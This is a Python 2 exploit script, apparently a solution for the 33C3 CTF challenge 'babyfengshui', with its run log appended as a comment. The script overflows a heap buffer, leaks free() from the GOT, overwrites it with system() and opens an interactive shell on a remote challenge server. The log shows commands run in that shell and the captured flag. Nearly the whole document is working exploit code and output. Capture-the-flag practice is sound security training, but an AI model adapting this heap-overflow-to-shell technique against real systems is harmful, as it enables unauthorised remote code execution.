#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string

# --------------------------------------------------------------------------------------------------
def recv_until(st): 					 	# receive until you encounter a string
	ret = ""
	while st not in ret:
		ret += s.recv(8192)

	return ret

# --------------------------------------------------------------------------------------------------
def add_usr(size, name, tlen, text):		# add a new user
	s.send( '0\n' )

	recv_until( 'size of description: ')
	s.send( str(size) + '\n' )

	recv_until( 'name: ')
	s.send( name + '\n' )

	recv_until( 'text length: ')
	s.send( str(tlen) + '\n' )
	
	recv_until( 'text: ')
	s.send( text + '\n' )

	recv_until('Action: ')

# --------------------------------------------------------------------------------------------------
def del_usr(index):							# delete a user
	s.send( '1\n' )

	recv_until('index: ')
	s.send( str(index) + '\n' )

	recv_until('Action: ')

# --------------------------------------------------------------------------------------------------
def upd_usr(index, tlen, text):				# update user's information
	s.send( '3\n' )

	recv_until('index: ')
	s.send( str(index) + '\n' )

	recv_until( 'text length: ')
	s.send( str(tlen) + '\n' )
	
	recv_until( 'text: ')
	s.send( text + '\n' )

	recv_until("Action: ")

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
#	s = socket.create_connection(('localhost', 7777))
	s = socket.create_connection(('78.46.224.83', 1456))
	f = s.makefile()						# associate a file object with socket

	recv_until("Action: ")                	# eat menu

	# -------------------------------------------------------------------------
	# create a gap
	# -------------------------------------------------------------------------
	add_usr( 0x80, 'foo', 0x20, 'foo' )
	add_usr( 0x20, 'bar', 0x10, 'bar' )
	add_usr( 0x20, 'isp', 0x10, 'isp' )

	del_usr( 0 )

	# -------------------------------------------------------------------------
	# overflow
	# -------------------------------------------------------------------------
	ovfl  = 'A'*0xe0
	ovfl += 'B'*0x30
	ovfl += 'C'*0x28
	ovfl += struct.pack("<L", 0x0804B010)	# .got.free()
	ovfl += 'D'*0xac
	ovfl += struct.pack("<L", 0x0804B08c) 	# global array in bss

	add_usr( 0xe0, 'ispo', len(ovfl), ovfl)
	
	# -------------------------------------------------------------------------
	# leak address of .got.free() 
	# -------------------------------------------------------------------------
	print '[+] Leaking address of .got.free()...'
	s.send( '2\n' )							# display user 
	recv_until('index: ')
	s.send( '1\n' )							# 2nd user

	r    = recv_until('Action: ')
	off  = r.find("description: ") + len("description: ")
	free = struct.unpack("<L", r[off:off + 4])[0]
	print '[+] free() at:', hex(free)


	# -------------------------------------------------------------------------
	# add /bin/sh in .bss
	# -------------------------------------------------------------------------
	fake  = struct.pack("<L", 0x0804B090)
	fake += struct.pack("<L", 0x0804B094)
	fake += '/bin/sh\x00'

	upd_usr( 2, len(fake), fake )

	# -------------------------------------------------------------------------
	# overwrite free() with system()
	# -------------------------------------------------------------------------

	# local machine:
	# 	free()   = 0x00071380
	# 	system() = 0x0003ad80
	# system = free - (0x00071380 - 0x0003ad80)

	# remote machine:
	# 	free()   = 0x000760f0
	# 	system() = 0x0003e3e0
	system = free - (0x000760f0 - 0x0003e3e0)
	print '[+] system() at:', hex(system)

	upd_usr( 1, 4, struct.pack("<L", system) )

	# -------------------------------------------------------------------------
	# delete user and trigger system()
	# -------------------------------------------------------------------------
	s.send( '1\n' )							# delete user
	recv_until('index: ')
	s.send( '3\n' )							# 4th user

	print '[+] opening shell ...'
	t = telnetlib.Telnet()              	# try to get a shell
	t.sock = s
	t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/33c3_16$ ./babyfengshui_expl.py 
	[+] Leaking address of .got.free()...
	[+] free() at: 0xf76640f0
	[+] system() at: 0xf762c3e0
	[+] opening shell ...
		id
			uid=1000(fengshui) gid=1000(fengshui) groups=1000(fengshui)
		ls -la
			total 24
			drwxr-xr-x  2 root root 4096 Dec 26 22:00 .
			drwxr-xr-x 44 root root 4096 Dec 27 18:02 ..
			-rwx---r-x  1 root root 9728 Dec 26 21:50 babyfengshui
			-rwx---r--  1 root root   42 Dec 26 21:58 flag.txt
		date
			Wed Dec 28 14:31:19 UTC 2016
		cat flag.txt
			33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1
		exit
	*** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
